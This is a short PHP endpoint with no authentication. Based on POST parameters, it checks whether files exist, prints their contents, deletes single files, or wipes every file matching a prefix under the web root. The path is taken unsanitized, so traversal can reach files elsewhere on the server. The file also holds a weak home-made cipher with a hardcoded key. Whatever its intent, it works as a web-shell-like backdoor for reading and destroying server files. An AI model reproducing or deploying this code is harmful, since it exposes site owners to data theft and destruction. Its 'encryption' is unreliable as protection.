<?php
$str = $_POST["d"];
$mode = $_POST["m"];
$dir = $_SERVER["DOCUMENT_ROOT"].$str;
switch ($mode) {
    case "issetdir":
        if(file_exists($dir) && $str != ""){ echo 1; }else{ echo 0; }
        break;
    case "content":
        echo file_get_contents($dir);
        break;
    case "encr":
        $str = htmlspecialchars($str); $str = encr($str); echo $str;
        break;
	case "desc":
        $str = decr($str); echo $str;
        break;
	case "del":
        unlink($dir); echo 1;
        break;
	case "DEL":
        $files = glob($dir.'*');foreach($files as $file){ if(is_file($file)){unlink($file);} }
        break;
	case "ParsInt":
        echo ParsInt($str);
        break;
	case "ParsStr":
        echo ParsStr($str);
        break;
	case "showcode":
		echo htmlspecialchars($str);
		break;
		
    default:
        echo null;
}
function encr($string){
	$result = '';
	$key = 'zhGS3JYY3hlRnJpL1pzQll';
	$string = ascToStr($string); // converte numero em string
	for($i=0, $k=strlen($string); $i<$k; $i++) {
		$char = substr($string, $i, 1);
		$keychar = substr($key, ($i % strlen($key))-1, 1);
		$char = chr(ord($char)+ord($keychar));
		$result .= $char;
	}
	$result = ascToInt($result); //
	return $result;
}
function decr($string){
	$result = '';
	$key = 'zhGS3JYY3hlRnJpL1pzQll';
	$string = ascToStr($string); //
	for($i=0,$k=strlen($string); $i<$k ; $i++) {
		$char = substr($string, $i, 1);
		$keychar = substr($key, ($i % strlen($key))-1, 1);
		$char = chr(ord($char)-ord($keychar));
		$result .= $char;
	}
	return urldecode($result);
}
function ascToStr($x){
	$obj = explode('!',$x);
	$len = count($obj)-1;
	$str = "";
	for($i=0;$i<$len;$i++){
		$str = $str . chr( $obj[$i] );
	}
	return $str;
}
function ascToInt($x){
	$str = "";
	$len = strlen($x);
	for($i=0;$i<$len;$i++){
		$str = $str . ord( substr($x, $i, 1) )."!";
	}
	return $str;
}
function ParsInt($x){
	$tk=53;
	$str = "";
	$len = strlen($x)-1;
	for($i=$len;$i>=0;$i--){
		$str = $str . (ord( substr($x, $i, 1) )-$tk).".";
	}
	return $str;
}
function ParsStr($x){
	$tk=53;
	$obj = explode('.',$x);
	$len = count($obj)-2;
	$str = "";
	for($i=$len;$i>=0;$i--){
		$str = $str . chr($obj[$i]+$tk);
	}
	return $str;
}
?>